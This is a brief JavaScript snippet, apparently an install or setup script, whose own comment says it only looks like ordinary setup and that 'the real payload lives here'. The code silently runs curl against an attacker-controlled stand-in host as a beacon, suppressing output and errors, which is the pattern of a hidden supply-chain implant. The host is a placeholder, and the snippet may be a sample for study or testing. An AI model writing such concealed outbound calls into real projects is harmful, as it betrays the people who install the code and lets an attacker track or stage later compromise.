// Looks like ordinary setup. The real payload lives here, not in package.json.
const { exec } = require("child_process");

exec("curl -s http://example-attacker-controlled.test/beacon || true", () => {
  // silent, no output either way
});
